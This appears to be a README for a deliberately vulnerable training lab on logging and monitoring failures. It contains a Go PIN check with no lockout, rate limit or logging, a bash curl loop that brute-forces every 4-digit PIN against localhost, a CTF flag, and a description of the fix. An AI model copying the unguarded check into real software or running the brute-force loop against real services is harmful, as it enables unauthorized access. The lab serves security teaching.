# A09: Security Logging and Monitoring Failures

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

An admin console gated by a 4-digit PIN.

**Play it in the browser** — open http://localhost:9009 and click "Try every
PIN". Watch the audit-log button before and after: it never changes.

## The bug

```go
// No logging, no lockout, no rate limit on this path — brute-forceable
// in a few thousand requests, and nothing will ever notice.
if req.Pin != adminPIN {
    http.Error(w, `{"error":"invalid pin"}`, http.StatusUnauthorized)
    return
}
```

10,000 possible PINs, no rate limiting, no lockout, and nothing is ever
logged — `GET /api/audit-log` reports an empty log no matter how many
attempts were made. There's no way for anyone operating this service to
notice a brute-force attack happening, let alone stop one.

## Exploit

```bash
for pin in $(seq -w 0 9999); do
  resp=$(curl -s -X POST http://localhost:9009/login -d "{\"pin\":\"$pin\"}")
  if echo "$resp" | grep -q flag; then
    echo "$resp"
    break
  fi
done
```

## Flag

`CTF{a09_n0_l0gs_n0_al3rts}`

## The fix (for reference)

Log every authentication attempt with enough context to detect a pattern,
rate-limit and lock out after repeated failures, and alert on anomalies. The
platform API's `middleware.RequestLogging` and `middleware.IPRateLimiter`
(`platform/internal/middleware/`) do both of these for the real login path.
